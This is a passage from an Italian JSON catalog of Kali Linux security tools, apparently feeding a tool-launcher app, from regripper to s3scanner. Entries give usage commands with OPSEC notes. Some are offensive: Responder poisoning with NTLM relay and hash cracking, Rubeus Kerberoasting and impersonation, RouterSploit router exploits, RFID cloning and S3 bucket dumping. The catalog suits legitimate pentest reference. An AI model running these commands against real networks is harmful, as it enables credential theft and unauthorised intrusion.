l'estrazione di credenziali. Considerare tunneling se necessario.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Dumping"
    ],
    "notes": null
  },
  {
    "id": "regripper",
    "name": "regripper",
    "version": "3.0~git20221205.d588019",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/regripper/",
    "desc": "Estrae informazioni forensi da registry Windows: utenti, software, timeline eventi.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>RegRipper</strong> è un tool di forensics per estrarre e analizzare informazioni dal registry Windows. Utilizza plugin Perl per parsare hive di registro ed estrarre dati su utenti, software installato, programmi eseguiti, USB collegati e molto altro.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Plugin Architecture:</strong> oltre 200 plugin per diversi artefatti</p><p><strong>All Hives:</strong> supporta SAM, SYSTEM, SOFTWARE, NTUSER, UsrClass</p><p><strong>Timeline:</strong> estrae timestamp per ricostruzione eventi</p><p><strong>Artifact Extraction:</strong> MRU, shellbags, UserAssist, services</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Analisi hive NTUSER.DAT\nrip.pl -r NTUSER.DAT -f ntuser\n\n# Hive SYSTEM con plugin specifico\nrip.pl -r SYSTEM -p services\n\n# Lista plugin disponibili\nrip.pl -l\n\n# Output su file\nrip.pl -r SOFTWARE -f software > software_analysis.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>DFIR</strong>, analisi registry durante incident response.</p><p>Per <strong>malware analysis</strong>, identificazione persistence mechanisms.</p><p>Per <strong>investigation</strong>, ricostruzione attività utente.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Offline:</strong> analizza hive exportati, non sistema live.</p><p><strong>Completeness:</strong> coverage dipende dai plugin disponibili.</p><p><strong>Updates:</strong> plugin richiedono aggiornamenti per nuovi artefatti.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "05_Forensics",
      "Disk_Analysis"
    ],
    "notes": null
  },
  {
    "id": "responder",
    "name": "responder",
    "version": "3.1.7.0",
    "icon": "../app/icons/responder-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/responder/",
    "desc": "Poisoner LLMNR/NBT-NS/mDNS per cattura hash NTLMv1/v2 su reti Windows locali.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Responder</strong> è un poisoner per protocolli di name resolution Windows (LLMNR, NBT-NS, mDNS). Cattura hash NTLMv1/v2 rispondendo a richieste di risoluzione nomi, permettendo crack offline o relay per accesso a risorse.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>LLMNR/NBT-NS Poisoning:</strong> risponde a query di risoluzione fallite</p><p><strong>Hash Capture:</strong> cattura hash NTLMv1, NTLMv2, NTLMv2-SSP</p><p><strong>Rogue Servers:</strong> SMB, HTTP, FTP, LDAP, SQL server fake</p><p><strong>WPAD Poisoning:</strong> cattura credenziali proxy</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Poisoning completo con WPAD e SMB\nresponder -I eth0 -wrf -P\n\n# Modalità analisi (passive, no poisoning)\nresponder -I eth0 -A -v\n\n# Con ntlmrelayx per relay attack (no SMB/HTTP locali)\nresponder -I eth0 -r -d -w  # disabilita SMB/HTTP\nntlmrelayx.py -t smb://dc.target.com -smb2support\n\n# Targeting specifico con filtering\nresponder -I eth0 --lm --disable-ess\n\n# Combo con MultiRelay per shell\npython MultiRelay.py -t 192.168.1.0/24 -u ALL\nresponder -I eth0 -rv\n\n# DHCP poisoning per WPAD injection\nresponder -I eth0 -D --wpad --wredir\n\n# Cracking hash catturati\ncat /usr/share/responder/logs/*.txt | grep NTLMv2 | cut -d: -f1-6 &gt; hashes.txt\nhashcat -m 5600 hashes.txt wordlist.txt\n\n# IPv6 mode per DHCPv6 poisoning\nresponder -I eth0 -6</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>credential harvesting</strong>, cattura hash su reti Windows.</p><p>Per <strong>relay attacks</strong>, hash per ntlmrelayx a target vulnerabili.</p><p>Per <strong>initial access</strong>, cracking hash per password in chiaro.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Noisy:</strong> risposte a broadcast facilmente rilevabili.</p><p><strong>Detection:</strong> SIEM moderni rilevano poisoning.</p><p><strong>Network:</strong> richiede presenza sulla stessa rete/VLAN.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Kerberos_ADCS_Relay"
    ],
    "notes": null
  },
  {
    "id": "rev-proxy-grapher",
    "name": "rev-proxy-grapher",
    "version": "0~git20180301",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/rev-proxy-grapher/",
    "desc": "Visualizza catena reverse proxy tra client e server per mappare infrastruttura web.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>rev-proxy-grapher</strong> analizza header HTTP per identificare e visualizzare la catena di reverse proxy tra client e server backend. Utile per mappare infrastruttura web nascosta dietro CDN, WAF e load balancer.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Header Analysis:</strong> parsing di Via, X-Forwarded-For, X-Real-IP</p><p><strong>Chain Visualization:</strong> grafico della catena proxy</p><p><strong>Technology Detection:</strong> identifica tipo di proxy (nginx, Apache, CDN)</p><p><strong>Backend Discovery:</strong> rivela IP e hostname backend</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Analisi URL target\nrev-proxy-grapher http://target.com\n\n# Con output grafico\nrev-proxy-grapher http://target.com -o graph.png\n\n# Verboso per debug\nrev-proxy-grapher http://target.com -v</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>recon</strong>, mappatura infrastruttura web target.</p><p>Per <strong>WAF bypass</strong>, identificazione endpoint dietro protezioni.</p><p>Per <strong>pentest</strong>, comprensione architettura prima di attacco.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Passive:</strong> analisi basata su header di risposta.</p><p><strong>Limitations:</strong> proxy ben configurati non espongono header.</p><p><strong>CDN:</strong> può rivelare IP origin server.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Fingerprinting",
      "HTTP_Analysis"
    ],
    "notes": null
  },
  {
    "id": "rfcat",
    "name": "rfcat",
    "version": "2.0.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/rfcat/",
    "desc": "Framework per hacking RF con RfCat dongle: sniffing, replay, jam su frequenze sub-GHz.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>RfCat</strong> è un framework Python per hacking su frequenze radio sub-GHz usando hardware RfCat/YARD Stick One. Permette sniffing, trasmissione, replay attacks su dispositivi wireless come telecomandi, sensori IoT, sistemi di allarme.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Frequency Range:</strong> 300-928 MHz copertura sub-GHz</p><p><strong>Sniffing:</strong> cattura segnali RF per analisi</p><p><strong>Replay:</strong> ritrasmissione segnali catturati</p><p><strong>Python API:</strong> scriptabile per attacchi automatizzati</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Shell interattiva rfcat\nrfcat -r\n\n# Configurazione frequenza\nd.setFreq(433920000)  # 433.92 MHz\n\n# Sniffing\nd.RFrecv()\n\n# Trasmissione\nd.RFxmit(data)</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>IoT security</strong>, test sicurezza dispositivi wireless.</p><p>Per <strong>physical pentest</strong>, attacco a sistemi di controllo accessi.</p><p>Per <strong>research</strong>, analisi protocolli RF proprietari.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Legal:</strong> trasmissione RF non autorizzata è illegale.</p><p><strong>Hardware:</strong> richiede dongle YARD Stick One o compatibile.</p><p><strong>Range:</strong> trasmissione limitata dalla potenza del dispositivo.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "RFID_NFC"
    ],
    "notes": null
  },
  {
    "id": "rfdump",
    "name": "rfdump",
    "version": "1.6",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/rfdump/",
    "desc": "Legge e scrive tag RFID ISO 15693 per clonazione e analisi di card contactless.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>RFDump</strong> è un tool per lettura e scrittura di tag RFID conformi allo standard ISO 15693. Permette di analizzare, clonare e modificare card contactless ad alta frequenza (13.56 MHz) utilizzate in sistemi di accesso e identificazione.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>ISO 15693:</strong> supporto completo per standard vicinity cards</p><p><strong>Read/Write:</strong> lettura e scrittura memoria tag</p><p><strong>UID Discovery:</strong> identificazione unique identifier</p><p><strong>Block Operations:</strong> accesso a singoli blocchi memoria</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Lettura tag ISO 15693\nrfdump -r\n\n# Dump completo memoria\nrfdump -d -o dump.bin\n\n# Scrittura dati\nrfdump -w -i data.bin\n\n# Info tag\nrfdump -i</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>RFID security</strong>, analisi card di accesso.</p><p>Per <strong>cloning</strong>, duplicazione tag per test.</p><p>Per <strong>research</strong>, studio implementazioni ISO 15693.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Hardware:</strong> richiede reader RFID compatibile.</p><p><strong>Legal:</strong> clonazione card senza autorizzazione è illegale.</p><p><strong>Standard:</strong> funziona solo con ISO 15693, non altri standard.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "RFID_NFC"
    ],
    "notes": null
  },
  {
    "id": "ridenum",
    "name": "ridenum",
    "version": "1.7",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/ridenum/",
    "desc": "Enumera utenti Windows tramite RID cycling su sessioni SMB null session.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>RidEnum</strong> enumera utenti Windows attraverso la tecnica RID cycling su sessioni SMB. Sfruttando null session o credenziali guest, itera attraverso RID (Relative Identifiers) per scoprire username validi sul sistema target.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>RID Cycling:</strong> brute force di RID per trovare utenti</p><p><strong>Null Session:</strong> funziona senza credenziali se permesso</p><p><strong>Range Configurable:</strong> definizione range RID da testare</p><p><strong>SID Discovery:</strong> identifica SID del dominio/sistema</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Enumeration con null session\nridenum.py target_ip 500 50000\n\n# Con credenziali\nridenum.py target_ip 500 50000 -u user -p pass\n\n# Range RID specifico\nridenum.py target_ip 1000 2000</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>user enumeration</strong>, discovery utenti su sistemi Windows.</p><p>Per <strong>AD recon</strong>, identificazione account prima di password attacks.</p><p>Per <strong>pentest</strong>, mappatura utenti target.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Null session:</strong> molti sistemi moderni bloccano null session.</p><p><strong>Logging:</strong> tentativi SMB loggati sul target.</p><p><strong>Rate:</strong> enumeration intensiva genera molto traffico.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Infrastructure",
      "SMB"
    ],
    "notes": null
  },
  {
    "id": "rizin-cutter",
    "name": "rizin-cutter",
    "version": "2.4.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/rizin-cutter/",
    "desc": "GUI per Rizin/Ghidra: reverse engineering con graph, decompiler, hex editor integrato.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Cutter</strong> (<strong>Rizin-Cutter</strong>) è l'interfaccia grafica ufficiale per Rizin, con integrazione del decompiler Ghidra. Offre graph view delle funzioni, hex editor, debugger visuale e tutte le funzionalità di reverse engineering in un ambiente user-friendly.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Graph View:</strong> visualizzazione control flow graph delle funzioni</p><p><strong>Ghidra Decompiler:</strong> decompilazione in pseudo-C integrata</p><p><strong>Hex Editor:</strong> modifica binari con view sincronizzata</p><p><strong>Debugger:</strong> debugging integrato con breakpoint e stepping</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvio GUI\ncutter\n\n# Apertura binario\n# File -> Open -> seleziona binario\n\n# Analisi automatica all'apertura\n# Graph view con doppio click su funzione\n# Decompilazione nel pannello destro</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>malware analysis</strong>, analisi visuale di sample con decompilazione.</p><p>Per <strong>CTF</strong>, reversing con interfaccia intuitiva.</p><p>Per <strong>learning</strong>, apprendimento RE con visualizzazione chiara.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Risorse:</strong> analisi grandi binari richiede RAM significativa.</p><p><strong>Decompiler:</strong> output pseudo-C non sempre accurato.</p><p><strong>Alternative:</strong> IDA Pro, Ghidra standalone per funzionalità avanzate.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Reverse_Engineering"
    ],
    "notes": null
  },
  {
    "id": "rizin",
    "name": "rizin",
    "version": "0.8.1",
    "icon": "../app/icons/rizin-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/rizin/",
    "desc": "Fork moderno di Radare2 per analisi binaria, disassembly e reverse engineering.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Rizin</strong> è un fork di Radare2 focalizzato su usabilità e API stabili. Fornisce disassembler, debugger, analizzatore binario con sintassi comandi semplificata e migliore documentazione. Mantiene compatibilità con l'ecosistema r2.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Clean API:</strong> interfaccia più consistente rispetto a Radare2</p><p><strong>Multi-arch:</strong> supporto architetture x86, ARM, MIPS e altre</p><p><strong>Plugin System:</strong> estensibile con plugin C e scripting</p><p><strong>Cutter Integration:</strong> GUI ufficiale disponibile separatamente</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Apertura binario\nrizin binary\n\n# Analisi automatica\naaa\n\n# Lista funzioni\nafl\n\n# Disassembly funzione\npdf @main\n\n# Help comandi\n?</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>reverse engineering</strong>, alternativa moderna a Radare2.</p><p>Per <strong>binary analysis</strong>, ispezione eseguibili con API pulita.</p><p>Per <strong>automation</strong>, scripting analisi con rz-pipe.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Learning:</strong> curva apprendimento meno ripida di r2.</p><p><strong>Compatibilità:</strong> alcuni plugin r2 potrebbero non funzionare.</p><p><strong>Development:</strong> progetto in sviluppo attivo.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Reverse_Engineering"
    ],
    "notes": null
  },
  {
    "id": "ropper",
    "name": "ropper",
    "version": "1.13.8",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/ropper/",
    "desc": "Cerca ROP gadgets in binari PE/ELF/Mach-O per exploit development e bypass DEP/ASLR.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Ropper</strong> cerca gadget ROP (Return-Oriented Programming) in binari per costruire catene di exploit che bypassano DEP e ASLR. Supporta formati PE, ELF e Mach-O con ricerca semantica di gadget specifici.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Gadget Search:</strong> trova sequenze utili terminanti in ret/jmp/call</p><p><strong>Semantic Search:</strong> cerca gadget per funzionalità specifica</p><p><strong>Chain Builder:</strong> aiuta costruzione catene ROP</p><p><strong>Multi-format:</strong> PE, ELF, Mach-O, raw binary</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Cerca tutti i gadget\nropper -f binary\n\n# Cerca gadget specifici\nropper -f binary --search \"pop rdi\"\n\n# Solo gadget JOP\nropper -f binary --type jop\n\n# Genera chain per execve\nropper -f binary --chain execve</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>exploit development</strong>, costruzione payload ROP per buffer overflow.</p><p>Per <strong>CTF</strong>, challenge pwn con protezioni attive.</p><p>Per <strong>research</strong>, analisi gadget disponibili in librerie.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Complexity:</strong> ROP richiede comprensione profonda architettura.</p><p><strong>ASLR:</strong> leak address necessario per catene funzionanti.</p><p><strong>Alternatives:</strong> ROPgadget, one_gadget per usi specifici.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Reverse_Engineering"
    ],
    "notes": null
  },
  {
    "id": "routerkeygenpc",
    "name": "routerkeygenpc",
    "version": "1.1.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/routerkeygenpc/",
    "desc": "Genera password WiFi di default per router comuni basate su SSID e BSSID.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>RouterKeygenPC</strong> genera password WiFi di default per router comuni calcolandole da SSID e BSSID. Sfrutta algoritmi noti usati da produttori come Thomson, Huawei, Pirelli per generare password factory prevedibili.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Algorithm Database:</strong> algoritmi per decine di produttori</p><p><strong>SSID/BSSID Based:</strong> calcola password da identificatori rete</p><p><strong>Offline:</strong> non richiede connessione internet</p><p><strong>Multi-vendor:</strong> Thomson, Huawei, O2, Verizon e altri</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvio interfaccia\nrouterkeygenpc\n\n# Input SSID e BSSID dalla scansione WiFi\n# Tool calcola possibili password default\n# Test manuale delle password generate</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>WiFi pentesting</strong>, recupero password factory non cambiate.</p><p>Per <strong>security audit</strong>, verifica che password default siano state modificate.</p><p>Per <strong>password recovery</strong>, accesso a propria rete dimenticata.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Efficacia:</strong> funziona solo se utente non ha cambiato password.</p><p><strong>Legal:</strong> uso su reti altrui è illegale.</p><p><strong>Outdated:</strong> algoritmi nuovi potrebbero non essere supportati.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "WiFi"
    ],
    "notes": null
  },
  {
    "id": "routersploit",
    "name": "routersploit",
    "version": "3.4.7",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/routersploit/",
    "desc": "Framework exploitation per router, IoT e dispositivi embedded con moduli automatici.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>RouterSploit</strong> è un framework di exploitation stile Metasploit specifico per router, IoT e dispositivi embedded. Include moduli per exploit noti, scanner di vulnerabilità, credential testing e post-exploitation su dispositivi di rete.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Exploit Modules:</strong> centinaia di exploit per router e IoT</p><p><strong>Scanner:</strong> vulnerability scanner per dispositivi di rete</p><p><strong>Creds:</strong> moduli per default credentials testing</p><p><strong>Post-exploitation:</strong> moduli per estrazione config e backdoor</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvio framework\nrsf\n\n# Uso scanner\nuse scanners/autopwn\nset target 192.168.1.1\nrun\n\n# Exploit specifico\nuse exploits/routers/dlink/dir_300_615_auth_bypass\nset target 192.168.1.1\ncheck\nrun</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>IoT pentesting</strong>, assessment sicurezza dispositivi embedded.</p><p>Per <strong>network audit</strong>, verifica router aziendali.</p><p>Per <strong>research</strong>, sviluppo nuovi exploit per dispositivi.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Signatures:</strong> exploit noti, possono essere loggati.</p><p><strong>Damage:</strong> alcuni exploit possono crashare dispositivi.</p><p><strong>Updates:</strong> database exploit richiede aggiornamenti.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "Infrastructure",
      "IoT"
    ],
    "notes": null
  },
  {
    "id": "rsakeyfind",
    "name": "rsakeyfind",
    "version": "1.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/rsakeyfind/",
    "desc": "Cerca chiavi private RSA in memory dump e immagini disco per forensics.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>RSAKeyFind</strong> cerca chiavi private RSA in memory dump, immagini disco o file raw. Identifica strutture matematiche caratteristiche delle chiavi RSA (modulo, esponenti) permettendo recovery di chiavi usate per cifratura.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Pattern Search:</strong> identifica strutture chiavi RSA in dati raw</p><p><strong>Memory Analysis:</strong> estrae chiavi da dump RAM</p><p><strong>Disk Forensics:</strong> cerca chiavi in immagini disco</p><p><strong>Multi-format:</strong> supporta vari formati chiave</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Cerca in memory dump\nrsakeyfind memory.dump\n\n# Su immagine disco\nrsakeyfind disk.img\n\n# Su file raw\nrsakeyfind pagefile.sys</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>forensics</strong>, recovery chiavi crittografiche da sistemi compromessi.</p><p>Per <strong>incident response</strong>, identificazione chiavi usate da malware.</p><p>Per <strong>cold boot attacks</strong>, estrazione chiavi da RAM residua.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>False positives:</strong> può identificare pattern simili non-chiavi.</p><p><strong>Encryption:</strong> chiavi potrebbero essere cifrate a loro volta.</p><p><strong>Scope:</strong> solo RSA, non altri algoritmi.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "05_Forensics",
      "Memory_Analysis"
    ],
    "notes": null
  },
  {
    "id": "rsmangler",
    "name": "rsmangler",
    "version": "1.5",
    "icon": "../app/icons/rsmangler-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/rsmangler/",
    "desc": "Genera wordlist personalizzate applicando trasformazioni comuni a parole base.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>RSMangler</strong> genera wordlist personalizzate applicando trasformazioni comuni a parole base. Partendo da keyword target-specific, applica leetspeak, capitalizzazione, append numeri/simboli per creare dizionari ottimizzati per password attacks.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Transformations:</strong> leetspeak, caps, reverse, append</p><p><strong>Number Append:</strong> aggiunge anni, sequenze numeriche</p><p><strong>Symbol Inject:</strong> inserisce caratteri speciali comuni</p><p><strong>Combination:</strong> combina multiple trasformazioni</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Da file di parole base\nrsmangler -f base_words.txt -o wordlist.txt\n\n# Con trasformazioni specifiche\nrsmangler -f words.txt --leet --years\n\n# Pipe da input\necho 'company' | rsmangler\n\n# Limita lunghezza output\nrsmangler -f words.txt --min 8 --max 16</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>targeted attacks</strong>, wordlist basate su informazioni target.</p><p>Per <strong>password audit</strong>, test password policy aziendali.</p><p>Per <strong>social engineering</strong>, password basate su info raccolte.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Size:</strong> output può crescere esponenzialmente.</p><p><strong>Efficiency:</strong> wordlist mirate più efficaci di brute force.</p><p><strong>OSINT:</strong> combinare con informazioni raccolte sul target.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "00_Common",
      "Wordlists"
    ],
    "notes": null
  },
  {
    "id": "rubeus",
    "name": "rubeus",
    "version": "1.6.4",
    "icon": "../app/icons/rubeus-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/rubeus/",
    "desc": "Toolset Kerberos per attacchi AD: AS-REP roasting, S4U, delegation, golden ticket.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Rubeus</strong> è un toolset C# per attacchi Kerberos su Active Directory. Supporta AS-REP roasting, Kerberoasting, S4U abuse, constrained/unconstrained delegation, forging ticket (golden/silver) e molto altro. Tool essenziale per AD pentesting.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>AS-REP Roasting:</strong> estrae hash crackabili da account senza preauth</p><p><strong>Kerberoasting:</strong> richiede TGS per service account da crackare</p><p><strong>S4U Abuse:</strong> impersonation via delegation</p><p><strong>Ticket Forging:</strong> golden/silver ticket con chiavi compromesse</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Kerberoasting\nRubeus.exe kerberoast /outfile:hashes.txt\n\n# AS-REP roasting\nRubeus.exe asreproast\n\n# Request TGT\nRubeus.exe asktgt /user:admin /password:pass\n\n# S4U impersonation\nRubeus.exe s4u /user:svc /rc4:hash /impersonateuser:admin</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>AD exploitation</strong>, attacchi Kerberos completi.</p><p>Per <strong>privilege escalation</strong>, abuse delegation per impersonation.</p><p>Per <strong>persistence</strong>, golden ticket per accesso duraturo.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> attività Kerberos anomala rilevabile da MDI.</p><p><strong>Logging:</strong> richieste ticket loggate su DC.</p><p><strong>EDR:</strong> Rubeus noto, detection signature alte.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Kerberos_ADCS_Relay"
    ],
    "notes": null
  },
  {
    "id": "rz-ghidra",
    "name": "rz-ghidra",
    "version": "0.8.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/rz-ghidra/",
    "desc": "Plugin che integra decompiler Ghidra in Rizin per analisi codice decompilato.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>rz-ghidra</strong> è un plugin che integra il decompiler di Ghidra in Rizin. Permette di ottenere output pseudo-C delle funzioni analizzate direttamente in Rizin/Cutter senza necessità di usare Ghidra standalone.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Decompilation:</strong> pseudo-C da disassembly</p><p><strong>Integration:</strong> seamless con Rizin e Cutter</p><p><strong>Sync:</strong> sincronizzazione con vista disassembly</p><p><strong>Renaming:</strong> modifiche propagate al decompiler</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># In Rizin, dopo analisi\npdg @main    # Decompila funzione main\n\n# In Cutter GUI\n# Pannello Decompiler automaticamente disponibile\n# Seleziona funzione per vedere pseudo-C</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>reverse engineering</strong>, comprensione rapida logica funzioni.</p><p>Per <strong>malware analysis</strong>, analisi comportamento con codice leggibile.</p><p>Per <strong>vulnerability research</strong>, identificazione bug nel pseudo-C.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Accuracy:</strong> decompilazione non sempre perfetta.</p><p><strong>Optimization:</strong> codice ottimizzato può produrre output confuso.</p><p><strong>Resources:</strong> decompilazione richiede risorse significative.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Reverse_Engineering"
    ],
    "notes": null
  },
  {
    "id": "s3scanner",
    "name": "s3scanner",
    "version": "3.0.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/s3scanner/",
    "desc": "Trova bucket S3 pubblici e misconfigured con enumeration di file e permessi.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>S3Scanner</strong> trova bucket AWS S3 pubblici e misconfigured. Enumera contenuti, verifica permessi di lettura/scrittura e identifica dati sensibili esposti. Essenziale per cloud security assessment e bug bounty.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Bucket Discovery:</strong> enumera bucket da wordlist o pattern</p><p><strong>Permission Check:</strong> verifica read/write/list permissions</p><p><strong>Content Listing:</strong> enumera oggetti nei bucket accessibili</p><p><strong>Dump Support:</strong> scarica contenuti di bucket pubblici</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan lista bucket\ns3scanner scan -b buckets.txt\n\n# Generazione nomi da keyword\ns3scanner scan -k company\n\n# Con dump contenuti\ns3scanner scan -b bucket.txt --dump\n\n# Verifica singolo bucket\ns3scanner scan -b company-backup</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>cloud security</strong>, identificazione bucket S3 esposti.</p><p>Per <strong>bug bounty</strong>, discovery data leak su target.</p><p>Per <strong>OSINT</strong>, ricerca informazioni in bucket pubblici.</p><br><hr><h4 class=\"rt-red\">Considerazioni 